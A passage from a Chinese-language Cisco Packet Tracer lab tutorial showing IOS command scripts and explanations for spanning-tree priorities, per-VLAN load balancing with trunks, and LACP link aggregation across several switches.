start="3"><li><p><strong>S2配置命令，如图10-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/容错配置-S2配置.png" alt="容错配置-S2配置"></center><center>图10-4 S2配置</center><p><strong>命令配置</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S2   spanning<span class="token operator">-</span>tree mode pvst   spanning<span class="token operator">-</span>tree vlan <span class="token number">1</span> priority <span class="token number">8192</span>   <span class="token keyword">end</span></code></pre><ol start="4"><li><p><strong>S3配置命令，如图10-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/容错配置-S3配置.png" alt="容错配置-S3配置"></center><center>图10-5 S3配置</center><p><strong>命令配置</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S3   spanning<span class="token operator">-</span>tree mode pvst   spanning<span class="token operator">-</span>tree vlan <span class="token number">1</span> priority <span class="token number">12288</span>   <span class="token keyword">end</span></code></pre><ol start="5"><li><p><strong>S4配置命令，如图10-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/容错配置-S4配置.png" alt="容错配置-S4配置"></center><center>图10-6 S4配置</center><p><strong>命令配置</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S4   spanning<span class="token operator">-</span>tree mode pvst   spanning<span class="token operator">-</span>tree vlan <span class="token number">1</span> priority <span class="token number">4096</span>   <span class="token keyword">end</span></code></pre><ol start="6"><li><p><strong>S5配置命令，如图10-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/容错配置-S5.png" alt="容错配置-S5"></center><center>图10-7 S5</center><p><strong>命令配置</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S5   spanning<span class="token operator">-</span>tree mode pvst   spanning<span class="token operator">-</span>tree vlan <span class="token number">1</span> priority <span class="token number">16384</span>   <span class="token keyword">end</span></code></pre><ol start="7"><li><p><strong>S6配置命令，如图10-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/容错配置S6配置.png" alt="容错配置S6配置"></center><center>图10-8 S6配置</center><p><strong>命令配置</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S6   spanning<span class="token operator">-</span>tree mode pvst   spanning<span class="token operator">-</span>tree vlan <span class="token number">1</span> priority <span class="token number">20480</span>   <span class="token keyword">end</span></code></pre><ol start="8"><li><p><strong>S7配置命令，如图10-9所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/容错配置-S7配置.png" alt="容错配置-S7配置"></center><center>图10-9 S7配置</center><p><strong>命令配置</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S7   spanning<span class="token operator">-</span>tree mode pvst   <span class="token keyword">end</span></code></pre><ol start="9"><li><p><strong>根据配置构建的生成树如图10-10所示</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(b) 生成树协议阻塞的端口.png" alt="生成树协议阻塞的端口"></center><center>图10-10 生成树协议阻塞的端口</center></li><li><p><strong>删除交换机S4和S5之间、交换机S5和S7的物理链路后，网络拓扑如图10-11所示</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(c) 删除物理链路1.png" alt="删除物理链路1"></center><center>图10-11 删除物理链路1</center></li><li><p><strong>生成树重新调整阻塞端口后，构建的网络拓扑如图10-12所示</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(d)生成树协议重新调整阻塞端口.png" alt="生成树协议重新调整阻塞端口"></center><center>图10-12 生成树协议重新调整阻塞端口</center></li></ol><h3 id="关键命令说明-3"><a href="#关键命令说明-3" class="headerlink" title="关键命令说明"></a>关键命令说明</h3><ol><li><p><strong>选择生成树工作模式，如图10-13所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/选择生成树工作模式.png" alt="选择生成树工作模式"></center><center>图10-13 选择生成树工作模式</center></li></ol><ul><li>spanning-tree mode pvst：将交换机生成树协议的工作模式指定为基于VLAN的生成树（Per-Vlan Spanning Tree，PVST）模式。<ul><li>spanning-tree mode rapid-pvst：将交换机生成树协议的工作模式指定为快速收敛模式。</li></ul></li></ul><ol start="2"><li><p><strong>配置交换机优先级，如图10-14所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置交换机优先级.png" alt="配置交换机优先级"></center><center>图10-14 配置交换机优先级</center></li></ol><ul><li>spanning-tree vlan 1 priority 4096：将交换机在构建基于VLAN1的生成树中所有具有的优先级指定为4096。<ul><li>spanning-tree vlan 1 root primary：将交换机设置成基于VLAN 1的生成树的根网桥。</li></ul></li></ul><ol start="3"><li><p><strong>设置快速转换端口，如图10-15所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/设置快速转换端口.png" alt="设置快速转换端口"></center><center>图10-15 设置快速转换端口</center><ul><li>spanning-tree portfast default：一旦交换机执行该命令，交换机端口中不是阻塞端口，且是接入端口的那些端口的状态立即转换成转发状态，无须经过侦听和学习这两个中间状态。（该命令作用于交换机中所有接入端口）。</li><li>spanning-tree portfast disable：用于取消spanning-tree portfast default命令对该交换机接入端口的作用。</li><li>spanning-tree portfast trunk：该命令使得spanning-tree portfast default命令对该交换机共享端口也起作用。</li></ul></li></ol><h2 id="负载均衡实验"><a href="#负载均衡实验" class="headerlink" title="负载均衡实验"></a>负载均衡实验</h2><h3 id="实验内容-9"><a href="#实验内容-9" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        由于可以基于每一个VLAN单独构建生成树，且这些生成树可以有不同的的根交换机和起作用的物理链路。因此，可以通过配置，一是使得每一个VLAN存在冗余路径，且可以通过生成树协议实现容错功能；二是使得不同VLAN对应的生成树有着不同的根交换机和起作用的物理链路，从而使得以太网中不存在所有生成树中都不起作用的物理链路。</p><p>​        以太网结构如图11-1（a）所示，在该以太网上分别生成基于VLAN 2和VLAN 3的生成树，且通过配置使得基于VLAN 2的生成树如图11-1（b）所示，基于VLAN 3的生成树如图11-1（c）所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-图4.2(a) 原始网络结构.png" alt="负载均衡-图4.2(a) 原始网络结构"></center><center>图11-1(a) 原始网络结构</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-图4.2(b) 基于VLAN2的生成树.png" alt="负载均衡-图4.2(b) 基于VLAN2的生成树"></center><center>图11-1(b) 基于VLAN 2的生成树</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-图4.2(c) 基于VLAN3的生成树.png" alt="负载均衡-图4.2(c) 基于VLAN3的生成树"></center><center>图11-1(c) 基于VLAN 3的生成树</center><h3 id="实验目的-9"><a href="#实验目的-9" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>掌握交换机生成树协议配置过程</li><li>验证生成树协议建立生成树过程</li><li>验证实现负载均衡的过程</li><li>验证生成树协议实现容错的机制</li></ol><h3 id="实验原理-9"><a href="#实验原理-9" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        终端与VLAN之间的关系如表11-1所示。如果仅仅为了解决负载均衡问题，只需根据表11-2所示内容为每一个VLAN配置端口，就可保证每一个交换机端口至少在一颗生成树中不是阻塞端口，且该端口连接的物理链路至少在一颗生成树中起作用。但这种端口配置方式没有容错功能，除了互连交换机S1和S2的物理链路，其他任何物理链路发生故障都将影响属于同一个VLAN的终端之间的连通性。</p><center>表11-1 终端与VLAN之间的关系</center><table><thead><tr><th align="center">VLAN</th><th align="center">终端</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">终端A、终端C</td></tr><tr><td align="center">VLAN 3</td><td align="center">终端B、终端D</td></tr></tbody></table><center>表11-2 VLAN与交换机端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口(Access)</th><th align="center">共享端口</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">S1.1、S1.2、S3.1、S3.4、S4.1、S4.4</td><td align="center"></td></tr><tr><td align="center">VLAN 3</td><td align="center">S2.1、S2.2、S3.2、S3.3、S4.2、S4.3</td><td align="center"></td></tr></tbody></table><p>​        为了实现负载均衡，要求不同VLAN对应的生成树中的阻塞端口是不同的，即某个端口如果在基于VLAN 2的生成树中是阻塞端口，在基于VLAN 3的生成树中不再是阻塞端口。为了做到这一点，对图11-1（a）所示的网络结构，通过配置，使得交换机S1和S2分别成为基于VLAN 2和VLAN 3的生成树的根网桥。对于基于VLAN 2的生成树，通过配置使得交换机S2的优先级大于交换机S3和S4。对于基于VLAN 3的生成树，通过配置使得交换机S1的优先级大于交换机S3和S4。为了使网络的容错性达到最大化，将所有交换之间的链路配置成被VLAN 2和VLAN 3共享的共享链路，VLAN与交换机端口之间映射如表11-3所示。这种情况下，基于VLAN 2的生成树如图11-1（b）所示，交换机S3端口3和交换机S4端口3成为阻塞端口；基于VLAN3的生成树如图11-1（c）所示，交换机S3端口4和交换机S4端口4成为阻塞端口。对于这两颗分别基于VLAN 2和VLAN 3的生成树，一是由于不同生成树的阻塞端口是不同的，使得所有链路都有可能承载某个VLAN内的流量；二是对应每一个VLAN，属于同一VLAN的终端之间存在多条传输路径，在其中一条或多条物理链路发生故障的情况下，仍能保证属于同一VLAN的终端之间的连通性。</p><center>表11-3 VLAN与交换机端口映射</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口</th><th align="center">共享端口</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">S3.1、S4.1</td><td align="center">S1.1、S1.2、S1.3、S2.1、S2.2、S2.3、S3.3、S3.4、S4.3、S4.4</td></tr><tr><td align="center">VLAN 3</td><td align="center">S3.2、S4.2</td><td align="center">S1.1、S1.2、S1.3、S2.1、S2.2、S2.3、S3.3、S3.4、S4.3、S4.4</td></tr></tbody></table><h3 id="实验步骤-9"><a href="#实验步骤-9" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图11-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-图4.2(a) 原始网络结构.png" alt="构建网络结构"></center><center>图11-2 构建网络结构</center></li><li><p><strong>按照表4.2所示内容在各个交换机中创建VLAN，并为VLAN分配交换机端口，完成生成树构建后，所有交换机端口都处于转发状态，网络实现了负载均衡，如图11-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/无容错负载均衡.png" alt="无容错负载均衡"></center><center>图11-3 无容错负载均衡</center></li><li><p><strong>通过ping操作验证属于同一VLAN的终端之间的连通性，如图11-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-终端A至终端C1.png" alt="负载均衡-终端A至终端C1"></center><center>图11-4 终端A至终端C1</center></li><li><p><strong>删除交换机S1与交换机S4之间链路后，通过ping操作验证终端A和终端C之间无法相互通信，如图11-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-终端A至终端C2.png" alt="负载均衡-终端A至终端C2"></center><center>图11-5 终端A至终端C2</center></li><li><p><strong>为S1配置有容错功能的负载均衡，如图11-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-S1配置.png" alt="负载均衡-S1配置"></center><center>图11-6 S1配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S1   vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span>   switchport mode trunk    <span class="token keyword">exit</span>   spanning<span class="token operator">-</span>tree mode pvst   spanning<span class="token operator">-</span>tree vlan <span class="token number">2</span> priority <span class="token number">4096</span>   spanning<span class="token operator">-</span>tree vlan <span class="token number">3</span> priority <span class="token number">8192</span>   <span class="token keyword">end</span></code></pre><ol start="6"><li><p><strong>为S2配置有容错功能的负载均衡，如图11-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-S2配置.png" alt="负载均衡-S2配置"></center><center>图11-7 S2配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S2   vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span>   switchport mode trunk    <span class="token keyword">exit</span>   spanning<span class="token operator">-</span>tree mode pvst   spanning<span class="token operator">-</span>tree vlan <span class="token number">2</span> priority <span class="token number">4096</span>   spanning<span class="token operator">-</span>tree vlan <span class="token number">3</span> priority <span class="token number">8192</span>   <span class="token keyword">end</span></code></pre><ol start="7"><li><p><strong>为S3配置有容错功能的负载均衡，如图11-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-S3配置.png" alt="负载均衡-S3配置"></center><center>图11-9 S3配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S3    vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">4</span>   switchport mode trunk   <span class="token keyword">exit</span>   spanning<span class="token operator">-</span>tree mode pvst   <span class="token keyword">end</span></code></pre><ol start="8"><li><p><strong>为S4配置有容错功能的负载均衡，如图11-9所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-S4配置.png" alt="负载均衡-S4配置"></center><center>图11-9 S4配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S4   vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">4</span>   switchport mode trunk   <span class="token keyword">exit</span>   spanning<span class="token operator">-</span>tree mode pvst   <span class="token keyword">end</span></code></pre><ol start="9"><li><p><strong>通过ping操作验证属于同一VLAN的终端之间的连通性，如图11-10所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-终端A至终端C3.png" alt="负载均衡-终端A至终端C3"></center><center>图11-10 终端A至终端C3</center></li><li><p><strong>删除交换机S1与交换机S4之间链路后，通过ping操作验证终端A和终端C之间的连通性。网络的容错功能得到验证，如图11-11所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/负载均衡-终端A至终端C4.png" alt="负载均衡-终端A至终端C4"></center><center>图11-11 终端A至终端C4</center></li></ol><h1 id="第5章-链路聚合实验"><a href="#第5章-链路聚合实验" class="headerlink" title="第5章 链路聚合实验"></a>第5章 链路聚合实验</h1><p>​        链路集合技术可以将多条物理链路聚合为单条逻辑链路，且使得该逻辑链路的带宽是这些物理链路的带宽之和，链路集合技术主要用于提高互连交换机的逻辑链路的带宽，因此，常常与VLAN、生成树和RSPAN一起使用。</p><h2 id="链路聚合配置实验"><a href="#链路聚合配置实验" class="headerlink" title="链路聚合配置实验"></a>链路聚合配置实验</h2><h3 id="实验内容-10"><a href="#实验内容-10" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        如图12-1所示，交换机S1与S2之间用三条物理链路相连，这三条物理链路通过链路聚合技术为单条逻辑链路，这条逻辑链路的带宽是三条物理链路的带宽，对于交换机S1和S2，连接这三条物理链路的三个交换机端口聚合为三个逻辑端口。实现MAC帧转发时，逻辑端口的功能等同于物理端口。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-网络拓扑.png" alt="链路聚合-网络拓扑"></center><center>图12-1 网络拓扑</center><h3 id="实验目的-10"><a href="#实验目的-10" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>掌握链路聚合配置过程</li><li>了解链路聚合控制协议（Link Aggregation Control Protocol，LACP）的协商过程</li><li>了解MAC帧分发算法</li></ol><h3 id="实验原理-10"><a href="#实验原理-10" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        在PT中，连接聚合为逻辑链路的一组物理链路的一组端口称为<strong>端口通道</strong>。不同的聚合链路对应不同的端口通道，用端口通道号唯一标识每一个端口通道。对于交换机而言，端口通道等同于单个端口，对所有通过端口通道接收到的MAC帧，转发表中创建用于指明该MAC帧源MAC地址与该端口通道之间关联的转发项。</p><h3 id="实验步骤-10"><a href="#实验步骤-10" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图12-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-网络拓扑.png" alt="构建网络拓扑"></center><center>图12-2 构建网络拓扑</center></li><li><p><strong>对终端进行基本配置（IP地址、子网掩码），如图12-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-对终端A的基本配置.png" alt="链路聚合-对终端A的基本配置"></center><center>图12-3 对终端A的基本配置</center><p>其他终端按照终端A进行类似配置</p></li><li><p><strong>交换机S1的配置，如图12-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-S1配置.png" alt="链路聚合-S1配置"></center><center>图12-4 S1配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S1   port<span class="token operator">-</span>channel <span class="token keyword">load</span><span class="token operator">-</span>balance src<span class="token operator">-</span>dst<span class="token operator">-</span>mac   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">5</span>   channel<span class="token operator">-</span>protocol lacp   channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">1</span> mode active    <span class="token keyword">end</span></code></pre><ol start="4"><li><p><strong>交换机S2的配置，如图12-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-S2配置.png" alt="链路聚合-S2配置"></center><center>图12-5 S2配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S2   port<span class="token operator">-</span>channel <span class="token keyword">load</span><span class="token operator">-</span>balance src<span class="token operator">-</span>dst<span class="token operator">-</span>mac   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">5</span>   channel<span class="token operator">-</span>protocol lacp   channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">1</span> mode active    <span class="token keyword">end</span></code></pre><ol start="5"><li><p><strong>终端A至终端C，如图12-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-终端A至终端C.png" alt="链路聚合-终端A至终端C"></center><center>图12-6 终端A至终端C</center></li><li><p><strong>交换机S1MAC表，如图12-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-S1的MAC表.png" alt="链路聚合-S1的MAC表"></center><center>图12-7 S1的MAC表</center></li><li><p><strong>交换机S2MAC表，如图12-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-S2的MAC表.png" alt="链路聚合-S2的MAC表"></center><center>图12-8 S2的MAC表</center></li></ol><h3 id="关键命令说明-4"><a href="#关键命令说明-4" class="headerlink" title="关键命令说明"></a>关键命令说明</h3><ol><li><p>创建并分配端口给端口通道，如图12-9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合-创建并分配端口给端口通道.png" alt="链路聚合-创建并分配端口给端口通道"></center><center>图12-9 创建并分配端口给端口通道</center></li></ol><ul><li><p>channel-group 1 mode active：创建编号为1的端口通道；将一组特定的交换机端口分配给端口通道；指定active为分配给该端口通道的交换机端口的激活模式。</p></li><li><p>激活模式与链路聚合协议之间的关系，如表12-1所示。</p><center>表12-1 激活模式与链路聚合协议之间的关系</center><table><thead><tr><th align="center">模式</th><th align="center">链路聚合控制协议</th></tr></thead><tbody><tr><td align="center">active</td><td align="center">通过LACP协商过程激活端口，物理链路另一端模式或是active，或是passive</td></tr><tr><td align="center">passive</td><td align="center">通过LACP协商过程激活端口，物理链路另一端必须是active</td></tr><tr><td align="center">auto</td><td align="center">通过PAgP协商过程激活端口，物理链路另一端的模式必须是desirable</td></tr><tr><td align="center">desirable</td><td align="center">通过PAgP协商过程激活端口，物理链路另一端的模式或是desirable或是auto</td></tr><tr><td align="center">on</td><td align="center">手工激活，物理链路两端模式必须都是on</td></tr></tbody></table></li></ul><ol start="2"><li><p><strong>指定使用的链路聚合控制协议，如图12-10所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/指定使用的链路聚合控制协议.png" alt="指定使用的链路聚合控制协议"></center><center>图12-10 指定使用的链路聚合控制协议</center></li></ol><ul><li>channel-protocol lacp：指定LACP为这一组端口使用的链路聚合控制协议</li></ul><ol start="3"><li><p><strong>指定MAC帧分发策略，如图12-11所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/指定MAC帧分发策略.png" alt="指定MAC帧分发策略"></center><center>图12-11 指定MAC帧分发策略</center><ul><li><p>port-channel load-balance src-dst-mac：指定根据MAC帧的源和目的MAC地址确定用于传输该MAC帧的物理链路的分发策略。</p></li><li><p>分发策略：</p><ul><li>dst-ip：根据MAC帧封装的IP分组的目的IP地址确定用于传输该NAC帧的物理链路</li><li>dst-mac：根据MAC帧的目的MAC地址确定用于传输该MAC帧的物理链路</li><li>src-dst-ip：根据MAC帧封装的IP分组的源和目的IP地址确定用于传输该MAC帧的物理路径</li></ul></li><li><p>src-ip：根据MAC帧封装的IP分组的源IP地址确定用于传输该MAC帧的物理链路</p><ul><li>src-mac：根据MAC帧的源MAC地址确定用于传输该MAC帧的物理链路</li></ul></li></ul></li></ol><h2 id="链路聚合与VLAN配置实验"><a href="#链路聚合与VLAN配置实验" class="headerlink" title="链路聚合与VLAN配置实验"></a>链路聚合与VLAN配置实验</h2><h3 id="实验内容-11"><a href="#实验内容-11" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        网络结构及终端与VLAN之间关系如13-1图所示。互连交换机的多条物理链路聚合为单条逻辑链路，不同VLAN内的交换路径共享交换机之间的逻辑链路。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-网络拓扑.png" alt="链路聚合与VLAN-网络拓扑"></center><center>图13-1 网络拓扑</center><h3 id="实验目的-11"><a href="#实验目的-11" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>掌握链路聚合配置过程</li><li>了解MAC帧发送算法</li><li>掌握端口通道的配置过程</li><li>掌握VLAN与链路聚合之间的相互作用过程</li></ol><h3 id="实验原理-11"><a href="#实验原理-11" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        分别在三个交换机创建VLAN 2和VLAN 3，对于交换机S1，VLAN与端口之间的映射如表13-1所示，将端口1作为接入端口分配给VLAN 2，将端口2作为作为接入端口分配给VLAN 3，将连接逻辑链路的一组端口定义为编号为1 的端口通道，并将端口通道prot-channel 1作为被VLAN 2和VLAN 3共享的共享端口通道。对于交换机S2和S3，VLAN与端口之间映射分别如表13-2和表13-3所示。交换机S2将连接与交换机S1之间逻辑链路的一组端口定义为编号为1的端口通道，将连接与交换机S3之间逻辑链路的一组端口定义为编号为2的端口通道。三个交换机中端口通道与端口之间的关系如表13-4所示。</p><center>表13-1 交换机S1 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口</th><th align="center">共享端口·</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">1</td><td align="center">port-channel 1</td></tr><tr><td align="center">VLAN 3</td><td align="center">2</td><td align="center">port-channel 1</td></tr></tbody></table><center>表13-2 交换机S2 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口</th><th align="center">共享端口</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center"></td><td align="center">port-channel 1</td></tr><tr><td align="center">VLAN 3</td><td align="center"></td><td align="center">port-channel 2</td></tr></tbody></table><center>表13-3 交换机S3 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口</th><th align="center">共享端口</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">1</td><td align="center">port-channel 1</td></tr><tr><td align="center">VLAN 3</td><td align="center">2</td><td align="center">port-channel 1</td></tr></tbody></table><center>表13-4 端口通道配置表</center><table><thead><tr><th align="center">交换机</th><th align="center">端口通道</th><th align="center">物理端口</th></tr></thead><tbody><tr><td align="center">交换机S1</td><td align="center">port-channel 1</td><td align="center">f0/3,f0/4,f0/5</td></tr><tr><td align="center">交换机S2</td><td align="center">port-channel 1<br>port-channel 2</td><td align="center">f0/1,f0/2,f0/3<br>f0/4,f0/5,f0/6</td></tr><tr><td align="center">交换机S3</td><td align="center">port-channel 1</td><td align="center">f0/3,f0/4,f0/5</td></tr></tbody></table><h3 id="实验步骤-11"><a href="#实验步骤-11" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图13-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-网络拓扑.png" alt="构建网络拓扑"></center><center>图13-2 构建网络拓扑</center></li><li><p><strong>对终端的基本配置（IP地址、子网掩码），如图13-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-对终端A进行基本配置.png" alt="链路聚合与VLAN-对终端A进行基本配置"></center><center>图13-3 对终端A进行基本配置对终端A进行基本配置</center><p>其他终端进行类似配置</p></li><li><p><strong>交换机S1配置，如图13-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-S1配置.png" alt="链路聚合与VLAN-S1配置"></center><center>图13-4 S1配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S1    vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">5</span>   channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">1</span> mode <span class="token keyword">on</span>   <span class="token keyword">exit</span>   port<span class="token operator">-</span>channel <span class="token keyword">load</span><span class="token operator">-</span>balance src<span class="token operator">-</span>dst<span class="token operator">-</span>mac   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">int</span> port<span class="token operator">-</span>channel <span class="token number">1</span>   switchport mode trunk   <span class="token keyword">end</span></code></pre><ol 